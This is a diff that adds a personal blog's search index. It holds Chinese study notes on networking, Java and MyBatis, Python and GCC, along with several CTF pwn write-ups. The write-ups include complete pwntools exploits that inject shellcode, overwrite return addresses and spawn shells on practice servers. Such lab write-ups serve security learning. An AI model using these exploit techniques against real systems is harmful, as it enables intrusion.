@@ -1,0 +1,455 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>SOCKET、TCP、HTTP之间的区别与联系</title>
+    <url>/2023/07/01/SOCKET%E3%80%81TCP%E3%80%81HTTP%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/</url>
+    <content><![CDATA[<p>SOCKET、TCP、HTTP之间的区别与联系<br>（1）什么是socket<br>1.套接字（socket）是通信的基石，是支持TCP&#x2F;IP协议的网络通信的基本操作单元。<br>2.它是网络通信过程中端点的抽象表示，包含进行网络通信必须的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。（其实就是bind绑定）<br>（2）为什么需要socket<br>应用层通过传输层进行数据通信时，TCP会遇到同时为多个应用程序进程提供并发服务的问题。多个TCP连接或多个应用程序进程可能需要通过同一个 TCP协议端口传输数据。<br>为了区别不同的应用程序进程和连接，计算机操作系统为应用程序与TCP／IP协议交互提供了套接字(Socket)接口。【服务端利用多进程或多线程连接多个应用程序】<br>应用层可以和传输层通过Socket接口，区分来自不同应用程序进程或网络连接的通信，实现数据传输的并发服务。<br>（3）socket分类<br>SOCK_STREAM，流式套接字，用于TCP<br>SOCK_DGRAM，数据报套接字，用于UDP<br>SOCK_RAW，原始套接字，对于其他层次的协议操作时需要使用这个类型<br>HTTP<br>HTTP协议即超文本传送协议(Hypertext Transfer Protocol )，是Web联网的基础，也是手机联网常用的协议之一，HTTP协议是建立在TCP协议之上的一种应用。<br>（2）HTTP连接的特点<br>连接请求：一次连接。HTTP连接最显著的特点是客户端发送的每次请求服务器都需要回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为一次连接<br>连接请求：短连接(注意：socket是长连接)由于HTTP在每次请求结束后服务端都会主动释放连接，因此HTTP连接是一种“短连接”，要保持客户端程序的在线状态，客户端需要向服务器不断地发起连接请求。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。<br>TCP<br>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输的协议簇。<br>注意：TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。<br>HTTP、Socket、TCP的联系<br>创建Socket连接时，可以指定使用的传输层协议，Socket可以支持不同的传输层协议（TCP或UDP），例如当使用TCP协议进行连接时，该Socket连接就是一个TCP连接。Socket本身并不是协议，而是一个调用接口（API），通过Socket，我们才能使用TCP&#x2F;IP协议。<br>从程序员的层面上来说：socket则是对TCP&#x2F;IP协议的封装和应用。socket是封装好的接口，便于程序员调用。<br>SOCKET与HTTP<br>一、长连接与短连接<br>Socket是长连接：由于通常情况下Socket连接就是TCP连接，因此Socket连接一旦建立，通信双方即可开始相互发送数据内容，直到双方连接断开，这称为长连接(socket会自动向服务端发送心跳包吧，这样可一直保持连接)。<br>HTTP是短连接：HTTP连接使用的是“请求—响应”的方式，不仅在请求时需要先建立连接，而且需要客户端向服务器发出请求后，服务器端才能回复数据。【发送请求 -&gt; 回复 -&gt; 断开】，这称为短连接。<br>二、保持数据的实时同步<br>（1）此时若双方建立的是Socket连接，服务器就可以直接将数据传送给客户端；<br>在实际网络应用中，客户端到服务器之间的通信往往需要穿越多个中间节点，例如路由器、网关、防火墙等，大部分防火墙默认会关闭长时间处于非活跃状态的连接而导致Socket 连接断连，因此需要通过轮询告诉网络，该连接处于活跃状态。<br>（2）若双方建立的是HTTP连接，则服务器需要等到客户端发送一次请求后才能将数据传回给客户端。因此，客户端定时向服务器端发送连接请求，不仅可以保持在线，同时也是在“询问”服务器是否有新的数据，如果有就将数据传给客户端。<br>TCP&#x2F;IP和HTTP协议<br>TPC&#x2F;IP协议是传输层协议，主要解决数据在网络中如何传输，而HTTP是应用层协议，主要解决如何包装数据。<br>“我们在传输数据时，可以只使用（传输层）TCP&#x2F;IP协议，双方就能收发数据，但是无法解析数据；如果没有应用层，便无法识别数据内容，如果想要使传输的数据有意义，则必须使用到应用层协议，HTTP协议解决了浏览器和服务器之间通讯协议的数据格式解析；，应用层协议有很多，比如HTTP、FTP、TELNET等。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>web前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DynELF</title>
+    <url>/2023/08/15/DynELF/</url>
+    <content><![CDATA[<p>DynELf:通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>
+<p>模板：<br>p &#x3D; remote(ip, port)</p>
+<p>def leak(addr):<br>       payload2leak_addr &#x3D; “<strong><strong>” + pack(addr) + “</strong></strong>”<br>       p.send(payload2leak_addr)<br>       data &#x3D; p.recv()<br>       return data</p>
+<p>d &#x3D; DynELF(leak, pointer &#x3D; pointer_into_ELF_file, elf &#x3D; ELFObject)<br>system_addr &#x3D; d.lookup(‘system’, ‘libc’)<br>read_add &#x3D; d.lookup(‘read’,’libc’)</p>
+<p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数等输出函数且可以多次反复调用，并且DynELF找的是字符串</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ez_pz_hackover_2016</title>
+    <url>/2023/08/10/ez-pz-hackover-2016/</url>
+    <content><![CDATA[<p>例行检查，32位，开启了RELRO保护，二进制的保护机制看这里<br>由于没有开启nx保护，对于这题一开始想到的是利用写入shellcode来获取shell<br>试运行一下程序，看到程序一开始给我们了一个地址，随后让我们输入<br>32位ida载入，首先习惯性的shift+f12检索程序里的字符串，没有看到敏感的函数<br>从main函数开始看程序<br>一开始给我们输出了参数s的地址，之后利用fgets函数读入1023(0x3ff)长度的数据给s，s的大小是0x40c,没法造成溢出，之后将我们输入的数据利用strcmp函数跟crashme比较，如果不是这个字符串，就退出，<br>也就是我们应该输入 ‘crashme\x00’ 可以绕过这个if检查，之后执行vuln函数<br>往s参数里写入shellcode，执行vuln函数后让dest造成溢出，将返回地址修改为shellcode的地址去执行<br>完整exp<br>from pwn import *</p>
+<p>r&#x3D;remote(‘node3.buuoj.cn’,26843)<br>#p&#x3D;process(‘.&#x2F;ez_pz_hackover_2016’)<br>context.log_level&#x3D;’debug’</p>
+<p>#gdb.attach(p,’b <em>0x8048600’)<br>r.recvuntil(‘crash: ‘)<br>stack&#x3D;int(r.recv(10),16)<br>shellcode&#x3D;asm(shellcraft.sh())#利用pwntools自动生成shellcode<br>#print hex(stack)<br>payload&#x3D;’crashme\x00’+’a’</em>(0x16-8+4)+p32(stack-0x1c)+shellcode<br>r.sendline(payload)<br>#pause()</p>
+<p>r.interactive()</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson</title>
+    <url>/2023/10/27/fastjson/</url>
+    <content><![CDATA[<p>package org.example;</p>
+<p>import com.alibaba.fastjson.JSON;<br>import com.alibaba.fastjson.JSONArray;<br>import com.alibaba.fastjson.JSONObject;</p>
+<p>import java.io.BufferedReader;<br>import java.io.FileReader;<br>import java.io.IOException;<br>import java.util.ArrayList;<br>import java.util.HashMap;<br>import java.util.List;<br>import java.util.Map;<br>fastjson<br>public class GraphJSONReader {<br>    public static void main(String[] args) {<br>        String fileName &#x3D; “1.json”; &#x2F;&#x2F; 替换为你的JSON文件路径</p>
+<pre><code>    try &#123;
+        BufferedReader reader = new BufferedReader(new FileReader(fileName));
+        StringBuilder jsonContent = new StringBuilder();
+        String line;
+        while ((line = reader.readLine()) != null) &#123;
+            jsonContent.append(line);
+        &#125;
+        reader.close();
+
+        // 解析JSON数据
+        JSONArray jsonArray = JSON.parseArray(jsonContent.toString());
+
+        // 处理每个图定义
+        for (Object graphObject : jsonArray) &#123;
+            JSONObject jsonObject = (JSONObject) graphObject;
+            String kind = jsonObject.getString(&quot;kind&quot;);
+            JSONArray vexs = jsonObject.getJSONArray(&quot;vexs&quot;);
+
+            System.out.println(&quot;Graph Type: &quot; + kind);
+            System.out.println(&quot;Vertices: &quot; + vexs);
+
+            if (&quot;UDG&quot;.equals(kind)) &#123;
+                JSONArray arcs = jsonObject.getJSONArray(&quot;arcs&quot;);
+                JSONArray weight = jsonObject.getJSONArray(&quot;weight&quot;);
+                List&lt;List&lt;String&gt;&gt; adjacencyList = new ArrayList&lt;&gt;();
+                List&lt;List&lt;String&gt;&gt; weightList = new ArrayList&lt;&gt;();
+
+                for (int i = 0; i &lt; vexs.size(); i++) &#123;
+                    adjacencyList.add(new ArrayList&lt;&gt;());
+                    weightList.add(new ArrayList&lt;&gt;());
+                &#125;
+
+                int m=0;
+                for (Object arc : arcs) &#123;
+                    String arcStr = arc.toString();
+                    arcStr = arcStr.substring(1, arcStr.length() - 1); // 去除括号
+                    String[] endpoints = arcStr.split(&quot;,&quot;);
+                    String v1 = endpoints[0];
+                    String v2 = endpoints[1];
+                    int index1 = vexs.indexOf(v1);
+                    int index2 = vexs.indexOf(v2);
+                    adjacencyList.get(index1).add(v2);
+                    adjacencyList.get(index2).add(v1);
+                    weightList.get(index1).add((String) weight.get(m));
+                    weightList.get(index2).add((String) weight.get(m));
+                    m++;
+                &#125;
+
+                System.out.println(&quot;Adjacency List:&quot;);
+                for (int i = 0; i &lt; adjacencyList.size(); i++) &#123;
+                    System.out.println(vexs.get(i) + &quot; -&gt; &quot; + adjacencyList.get(i)+&quot;权值&quot;+weightList.get(i));
+                &#125;
+            &#125;else if (&quot;DN&quot;.equals(kind)) &#123;
+                JSONArray arcs = jsonObject.getJSONArray(&quot;arcs&quot;);
+                JSONArray weight = jsonObject.getJSONArray(&quot;weight&quot;);
+                List&lt;List&lt;String&gt;&gt; adjacencyList = new ArrayList&lt;&gt;();
+                List&lt;List&lt;String&gt;&gt; weightList = new ArrayList&lt;&gt;();
+
+                for (int i = 0; i &lt; vexs.size(); i++) &#123;
+                    adjacencyList.add(new ArrayList&lt;&gt;());
+                    weightList.add(new ArrayList&lt;&gt;());
+                &#125;
+                int m=0;
+                for (Object arc : arcs) &#123;
+                    String arcStr = arc.toString();
+                    arcStr = arcStr.substring(1, arcStr.length() - 1); // 去除括号
+                    String[] endpoints = arcStr.split(&quot;,&quot;);
+                    String v1 = endpoints[0];
+                    String v2 = endpoints[1];
+                    int index1 = vexs.indexOf(v1);
+                    adjacencyList.get(index1).add(v2);
+                    weightList.get(index1).add((String) weight.get(m));
+                    m++;
+                &#125;
+
+                System.out.println(&quot;Adjacency List:&quot;);
+                for (int i = 0; i &lt; adjacencyList.size(); i++) &#123;
+                    System.out.println(vexs.get(i) + &quot; -&gt; &quot; + adjacencyList.get(i)+&quot;权值&quot;+weightList.get(i));
+                &#125;
+            &#125;
+        &#125;
+    &#125; catch (IOException e) &#123;
+        e.printStackTrace();
+    &#125;
+&#125;
+</code></pre>
+<p>}</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hnk2022</title>
+    <url>/2023/08/21/hnk2022/</url>
+    <content><![CDATA[<p>[HNCTF 2022 Week1]ret2shellcode<br>1.checksec查看二进制文件<br>2.查找后门函数<br>objdump -t XXX               查看程序中使用到的函数<br>objdump -d XXX               查看程序中函数的汇编代码<br>objdump -d -M intel XXX        查看程序中函数的汇编代码，并且汇编代码是intel架构的<br>objdump -d -j .plt XXX          查看plt表<br>-j的参数有：.text  代码段<br>.const 只读数据段（有些编译器不使用此段，将只读数据并入.data段）<br>            .data  读写数据段<br>            .bss   bss段<br>3.发现read函数，存在栈溢出，s容量是256。然后将s复制到buff里，查找buff发现在bss段<br>但是文件存在nx保护。<br>4.同时有一个mprotect()函数，显示该段可以执行<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。<br>int mprotect(const void *start, size_t len, int prot);<br>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>1）PROT_READ：表示内存段内的内容可写；<br>2）PROT_WRITE：表示内存段内的内容可读；<br>3）PROT_EXEC：表示内存段中的内容可执行；<br>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
+<p>5.然后gdb调试，发现nx保护下，buu可执行。部分指令如下：<br>next&#x2F;n          单步调试<br>next&#x2F;n [num]    单步跳过num步<br>b main          在main函数处设置断点<br>vmmap           查看各段属性&#x2F;rxw<br>run&#x2F;r           运行程序</p>
+<p>6.exp如下：<br>from pwn import *<br>context(log_level &#x3D; “debug”, arch &#x3D; ‘amd64’)<br>p &#x3D; remote(‘node2.anna.nssctf.cn’, 28744)<br>buff_addr &#x3D; 0x4040A0<br>shellcode &#x3D; asm(shellcraft.sh())<br>payload &#x3D; shellcode.ljust(0x100+8, b’a’) + p64(buff_addr)<br>p.sendline(payload)<br>p.interactive()<br>这题shellcode需要插入buff中</p>
+<p>ezr0p32<br>有system无bin&#x2F;sh,所以bin&#x2F;sh需要自己构造<br>因为buf的位置上在bss处，可以借此把binsh写进去，然后构造payload，用0x1c+0x4个字节使程序发生溢出，返回地址改为system，system的返回地址为0，再执行上一个read函数，此时第一个sendline已经把&#x2F;bin&#x2F;sh写入bss段<br>data段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域，数据段属于静态内存分配。</p>
+<p>bss段有可执行权限，shellcode才能运行，可用gdb调试的vmmap命令查看，发现bss段可读可写可执行。范围是0x0804a000到0x0804b000，bss段地址0x0804a040在这个区间，且必须保证shellcode长度不超过这个区间即可，但到目前为止，shellcode具体地址依然不知道。<br>函数名：read<br>头文件：&lt;io.h&gt;<br>函数原型： int read(int handle,void *buf,int len);<br>功能：用于读取打开文件的内容<br>参数：int handle 为要读取的文件<br>          void *buf  为要将读取的内容保存的缓冲区<br>          int len    读取文件的长度<br>返回值：返回实际读取的字节数</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>maven使用心得</title>
+    <url>/2023/07/08/maven%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</url>
+    <content><![CDATA[<p>&#x2F;&#x2F;git命令<br>git config –global user.name ‘你的用户名’<br>git config –global user.email ‘你的邮箱’<br>git add .<br>git status<br>git commit -m “第一次版本提交”<br>git branch<br>git checkout branchname<br>git merge branchname<br>git remote add [alias] [url]<br>git push [alias] [branch]<br>git remote rm [别名]<br>&#x2F;&#x2F;maven项目push到gitee上<br><img src="/picture/%E5%9B%BE%E7%89%871.png"><br>&#x2F;&#x2F;从gitee克隆到本地的文件<br><img src="/picture/%E5%9B%BE%E7%89%873.png"><br>&#x2F;&#x2F;maven项目中导入mybatis坐标<br><img src="/picture/%E5%9B%BE%E7%89%872.png"></p>
+]]></content>
+      <tags>
+        <tag>web前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>7.10作业</title>
+    <url>/2023/07/10/mybatis/</url>
+    <content><![CDATA[<p>1检索所有的职工姓名与年薪<br>     public String toString() {<br>        return “User{“ +<br>                “, ename&#x3D;’” + ename + ‘&#39;‘<br>                “, salary&#x3D;” + salary +<br>                ‘}’+’\n’;<br>    }<br>##<select id="selectAll" resultType="org.example.pojo.User"><br>        select * from user<br>##</select><br><img src="/picture/%E5%9B%BE%E7%89%874.png"><br>2检索所有的工作和相应的部门编号<br><select id="selectAll" resultType="org.example.pojo.User"><br>        select job，deptno from emp where<br></select><br><img src="/picture/%E5%9B%BE%E7%89%875.png"><br>3检索工作是salesman的员工姓名<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where job&#x3D;’salesman’;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%876.png"><br>4检索员工津贴comm为null或comm小于300的员工姓名和津贴值<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where comm &lt;300 or comm&#x3D;300 or comm&#x3D;null;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%877.png"><br>5检索所有职员的姓名和所在部门名<br><select id="selectById" resultMap="userResultMap"><br>        select ename,deptno from emp;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%878.png"><br>6检索在任何位置有字母“A”的员工姓名<br><select id="selectById" resultMap="userResultMap"><br>        select * from emp where ename like ‘%a%’;<br></select><br><img src="/picture/%E5%9B%BE%E7%89%879.png"><br>7向表eemp中插入至少5条员工记录<br><insert id="add" ><br>        insert into eemp(empno, ename,job,hiredate,salary,comm,deptno) values (1,’SMITH’,’manager’,’2019-2-1’,3300,300,2);<br></insert><br>&#x2F;&#x2F; 接收参数<br>             Integer empno&#x3D;1;<br>             String ename&#x3D;”liming”;<br>             String job&#x3D;”liming”;<br>             String hiredate&#x3D;”liming”;<br>             double salary&#x3D;100;<br>             double comm&#x3D;100;<br>             double deptno&#x3D;100;</p>
+<p>&#x2F;&#x2F; 生成对象<br>            User user &#x3D; new User(empno, ename,job,hiredate,salary,comm,deptno);<br>&#x2F;&#x2F; 1.加载mybatis的核心配置文件，获取SqlSessionFactory对象<br>            String resource &#x3D; “mybatis-config.xml”;<br>            InputStream inputStream &#x3D; null;<br>            try {<br>                inputStream &#x3D; Resources.getResourceAsStream(resource);<br>                SqlSessionFactory sqlSessionFactory &#x3D; new<br>                        SqlSessionFactoryBuilder().build(inputStream);<br>&#x2F;&#x2F; 2.获取SqlSession对象，执行sql语句<br>&#x2F;&#x2F; 手动提交事务，使用sql.commit()方法<br>                SqlSession sqlSession &#x3D; sqlSessionFactory.openSession();<br>&#x2F;&#x2F; 自动提交事务<br>&#x2F;&#x2F; SqlSession sqlSession &#x3D; sqlSessionFactory.openSession(true);<br>&#x2F;&#x2F; 3.执行sql语句<br>                UserMapper userMapper &#x3D; sqlSession.getMapper(UserMapper.class);<br>&#x2F;&#x2F; 插入操作<br>                userMapper.add(user);<br>&#x2F;&#x2F; 提交事务<br>                sqlSession.commit();<br>&#x2F;&#x2F; 4.释放资源<br>                sqlSession.close();<br>            } catch (IOException e) {<br>                throw new RuntimeException(e);<br>            }<br>        }<br>}<br><img src="/picture/%E5%9B%BE%E7%89%8710.png"><br>8从eemp中删除名为“SMITH”的记录<br><delete id="delect"><br>        delete from eemp where ename &#x3D; ‘SMITH’;<br></delete><br><img src="/picture/%E5%9B%BE%E7%89%8711.png"></p>
+]]></content>
+      <tags>
+        <tag>web前端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pie绕过</title>
+    <url>/2023/08/21/pie%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>[NISACTF 2022]ezpie<br>已知：PIE保护——程序可能被加载到任意位置，所以位置是可变的。<br>程序返回了main的真实地址<br>存在后门函数shell<br>vuln()中的read 0x50u &gt;&gt; 28h，存在栈溢出<br>可以通过真实地址+偏移来计算任意函数真实地址<br>payload编写：溢出填充到返回地址前+后门函数真实地址（某函数真实地址+相对偏移量）<br>如果没有PIE——简单的ret2text，在vuln中的read处将程序执行流劫持到后门函数处即可。<br>然而存在PIE——所有的地址都是从一开始随机确定的，但是“相对偏移量保持不变”获取了main的真实地址——可以通过相对偏移量推出其他任意地址，然后就是正常的ret2text即可。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn_orw</title>
+    <url>/2023/08/14/pwn-orw/</url>
+    <content><![CDATA[<p>所谓orw就是指你的系统调用被禁止了，不能通过子进程去获得权限和flag，只能在该进程通过 open , read ,write来得到flag，这个时候可以通过seccomptools，来查看。<br>Exp:<br>from pwn import *<br>context.arch &#x3D; ‘i386’<br>p &#x3D; remote(‘node3.buuoj.cn’,28626)<br>shellcode &#x3D; shellcraft.open(‘&#x2F;flag’)<br>shellcode +&#x3D; shellcraft.read(‘eax’,’esp’,100)<br>shellcode +&#x3D; shellcraft.write(1,’esp’,100)<br>payload &#x3D; asm(shellcode)<br>p.send(payload)<br>p.interactive()</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python</title>
+    <url>/2023/06/25/python%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>Unix shell，通常被称作“命令行”，为Unix和类Unix操作系统提供了传统的用户界面。用户通过输入shell所执行的命令，引导计算机的操作。在微软Windows操作系统平台，类似程序是command.com，或者基于Windows NT内核操作系统的cmd.exe。<br>解释器有些像Unix shell：当调用时使用连接到一个tty设备作为标准输入，它交互地读取并执行命令；当用文件名参数或文件作为标准输入调用，它将读取并执行该文件中的脚本。<br>变量类型：字符串、字符<br>列表（修改，添加，删除）:举例<br> squares &#x3D; [1, 4, 9, 16, 25]<br> squares<br>[1, 4, 9, 16, 25]<br>列表可以嵌套<br>If语句<br> x &#x3D; int(raw_input(“Please enter an integer: “))<br>Please enter an integer: 42<br> if x &lt; 0:<br>… x &#x3D; 0<br>… print ‘Negative changed to zero’<br>… elif x &#x3D;&#x3D; 0:<br>… print ‘Zero’<br>… elif x &#x3D;&#x3D; 1:<br>… print ‘Single’<br>… else:<br>… print ‘More’<br>while语句（break.continue<br>）<br> a, b &#x3D; 0, 1<br> while b &lt; 1000:<br>… print b,<br>… a, b &#x3D; b, a+b<br>1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987<br>for语句<br>  Measure some strings:<br>… words &#x3D; [‘cat’, ‘window’, ‘defenestrate’]<br> for w in words:<br>… print w, len(w)<br>…<br>cat 3<br>window 6<br>defenestrate 12<br>元组：元组在输出时总是有括号的，以便于正确表达嵌套结构；在输入时可以有也可以<br>没有括号，不过括号经常都是必须的（如果元组是一个更大的表达式的一部分）。<br>集合：<br> basket &#x3D; [‘apple’, ‘orange’, ‘apple’, ‘pear’, ‘orange’, ‘banana’]<br> fruit &#x3D; set(basket) # create a set without duplicates<br> fruit<br>set([‘orange’, ‘pear’, ‘apple’, ‘banana’])<br> ‘orange’ in fruit # fast membership testing<br>True<br> ‘crabgrass’ in fruit<br>False<br>  Demonstrate set operations on unique letters from two words<br>…<br> a &#x3D; set(‘abracadabra’)<br> b &#x3D; set(‘alacazam’)<br> a # unique letters in a<br>set([‘a’, ‘r’, ‘b’, ‘c’, ‘d’])<br> a - b # letters in a but not in b<br>set([‘r’, ‘d’, ‘b’])<br> a | b # letters in either a or b<br>set([‘a’, ‘c’, ‘r’, ‘d’, ‘b’, ‘m’, ‘z’, ‘l’])<br> a &amp; b # letters in both a and b<br>set([‘a’, ‘c’])<br> a ^ b # letters in a or b but not both<br>set([‘r’, ‘d’, ‘b’, ‘m’, ‘z’, ‘l’])<br>推导式<br>字典<br> tel &#x3D; {‘jack’: 4098, ‘sape’: 4139}<br> tel[‘guido’] &#x3D; 4127<br> tel<br>{‘sape’: 4139, ‘guido’: 4127, ‘jack’: 4098}<br> tel[‘jack’]<br>4098<br> del tel[‘sape’]<br> tel[‘irv’] &#x3D; 4127<br> tel<br>{‘guido’: 4127, ‘irv’: 4127, ‘jack’: 4098}<br> tel.keys()<br>[‘guido’, ‘irv’, ‘jack’]<br> ‘guido’ in tel<br>True<br>模块<br> from fibo import fib, fib2<br> fib(500)<br>1 1 2 3 5 8 13 21 34 55 89 144 233 377<br>读写文件<br>处理异常<br>测试代码<br>类<br>类的定义就像函数定义（def语句），要先执行才能生效。(你当然可以把它放进if语句的某一分支，或者一个函数的内部。)实际应用中，类定义包含的语句通常是函数定义，不过其它语句也是可以的而且有时还会很有用——后面我们会再回来讨论。类中的函数定义通常有一个特殊形式的参数列表，这是由方法调用的协议决定的——同样后面会解释这些。进入类定义部分后，会创建出一个新的命名空间，作为局部作用域——因此，所有的赋值成为这个新命名空间的局部变量。特别是这里的函数定义会绑定新函数的名字。类定义正常结束时，一个类对象也就创建了。基本上它是对类定义创建的命名空间进行了一个包装；我们在下一节将进一步学习类对象的知识。原始的局部作用域（类定义引入之前生效的那个）得到恢复，类对象在这里绑定到类定义头部的类名（例子中是ClassName）。</p>
+]]></content>
+      <categories>
+        <category>code</category>
+      </categories>
+      <tags>
+        <tag>code</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python2</title>
+    <url>/2023/06/26/python%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%932/</url>
+    <content><![CDATA[<p>#类<br>class Student:<br>  native_pace &#x3D;”吉林” #直接写在类里面的变量成为类属性 </p>
+<p>初始化方法<br>   def <em>init</em>(self,name,age):<br>    self.name &#x3D; name<br>    self.age &#x3D; age</p>
+<p>写在类之外定义的成为函数，在类之内定义的成为方法<br>    def eat（self）:<br>      print(“学生在吃饭”)</p>
+<p>静态方法，不可以写self<br>    @staticmethod<br>    def method():<br>      print(“我使用了staticmethod进行修饰，所以我是静态方法”)</p>
+<p>类方法，写cls<br>    @classmethod<br>    def cm(cls):<br>      print(“我是类方法，因为我使用了classmethod进行修饰 “)<br>      实例方法的两种调用方式<br>stu1.eat()<br>stu2.eat()<br>Student.eat(stu1) </p>
+<p>def show()<br>  print(“定义在类之外的，称为函数”)</p>
+<p>为stu1动态绑定方法<br>stu1.show &#x3D; show</p>
+<p>为stu1动态绑定性别<br>stu1&#x3D;Student(“Jack”,20)<br>stu1.gender&#x3D;”男”</p>
+]]></content>
+      <categories>
+        <category>code</category>
+      </categories>
+      <tags>
+        <tag>code</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>system函数</title>
+    <url>/2023/07/02/system%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<p>Pwn函数分析<br>system(“&#x2F;bin&#x2F;sh”)函数<br>system()函数调用“&#x2F;bin&#x2F;sh -c command”执行特定的命令，阻塞当前进程直到command命令执行完毕<br>原型：<br>int system(const char *command);<br>返回值：<br>如果无法启动shell运行命令，system将返回127；出现不能执行system调用的其他错误时返回-1。如果system能够顺利执行，返回那个命令的退出码。<br>system函数执行时，会调用fork、execve、waitpid等函数。<br>int system(const char * cmdstring)<br> {<br>     pid_t pid;<br>     int status;<br>     if(cmdstring &#x3D;&#x3D; NULL){<br>          return (1);<br>     }<br>     if((pid &#x3D; fork())&lt;0){<br>             status &#x3D; -1;<br>     }<br>     else if(pid &#x3D;&#x3D; 0){<br>         execl(“&#x2F;bin&#x2F;sh”, “sh”, “-c”, cmdstring, (char *)0);<br>         _exit(127); &#x2F;&#x2F;子进程正常执行则不会执行此语句<br>        }<br>     else{<br>             while(waitpid(pid, &amp;status, 0) &lt; 0){<br>                 if(errno !&#x3D; EINTER){<br>                     status &#x3D; -1;<br>                     break;<br>                 }<br>             }<br>         }<br>         return status;<br> }<br>函数说明<br>system()会调用fork()产生子进程，由子进程来调用&#x2F;bin&#x2F;sh-c string来执行参数string字符串所代表的命令，此命&gt;令执行完后随即返回原调用的进程。<br>在调用system()期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。<br>返回值     &#x3D;-1:出现错误 &#x3D;0:调用成功但是没有出现子进程 &gt;0:成功退出的子进程的id<br>  如果system()在调用&#x2F;bin&#x2F;sh时失败则返回127，其他失败原因返回-1。若参数string为空指针(NULL)，则返回非零值&gt;。如果system()调用成功则最后会返回<br>执行shell命令后的返回值，但是此返回值也有可能为 system()调用&#x2F;bin&#x2F;sh失败所返回的127，因此最好能再检查errno 来确认执行成功。<br>附加说明<br>在编写具有SUID&#x2F;SGID权限的程序时请勿使用system()，system()会继承环境变量，通过环境变量可能会造成系统安全的问题。<br>注意：根据以上分析，当shell脚本不存在、没有执行权限等场景下时，以上前2个条件仍会成立，此时WEXITSTATUS(status)为127，126等数值。<br>所以，我们在shell脚本中不能将127，126等数值定义为返回值，否则无法区分中是shell的返回值，还是调用shell脚本异常的原因值。shell脚本中的返回值最好多1开始递增。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc</title>
+    <url>/2023/08/23/ret2libc/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>二进制文件</title>
+    <url>/2023/06/19/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>一、编译原理<br>1.编译器<br>编译器简单理解就是将一种语言（源语言）转换为等价的另一种语言（目标语言）的程序。</p>
+<p>编译器分为前端（Front end）和后端（Back end）两部分。</p>
+<p>前端：机器无关，把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集和程序相关的信息，存放到符号表中；<br>后端：机器相关，根据中间表示和符号表构造目标程序。<br>编译过程大致为5个步骤：</p>
+<p>词法分析（Lexical analysis）-》输出有意义的词素（Lexeme）<br>语法分析（Syntax analysis）-》产生语法树（Syntax tree）<br>语义分析（Semantic analysis）<br>中间代码生成和优化<br>代码生成和优化</p>
+<p>2.GCC编译过程<br>GCC编译主要有四个阶段：预处理（Preprocess）、编译（Compile）、汇编（Assemble）、链接（Link）。</p>
+<p>三个工具组件：ccl（第一和第二阶段）、as（第三阶段）、collect2（对ld命令的封装，第四阶段）</p>
+<ol>
+<li>预处理阶段：处理以#开头的预处理指令，如#include、#define等，转换后直接插入程序文本中，通常以.i作为拓展名。</li>
+</ol>
+<p>GCC  -E  hello.c -o hello.i #单独执行预处理<br>1<br>2. 编译阶段：执行词法分析、语法分析、语义分析以及优化，生成汇编代码。</p>
+<p>#GCC中预处理已经和编译合并处理<br>GCC -S hello.c -o hello.s<br>#masm指定为intel格式，fno-asynchronous-unwind-tables生成没有cfi宏的汇编指令，以提高可读性。<br>GCC -S hello.i -o -masm&#x3D;intel -fno-asynchronous-unwind-tables<br>3.汇编阶段：根据汇编指令和机器指令的对照表进行翻译，将.s翻译为目标文件.o。</p>
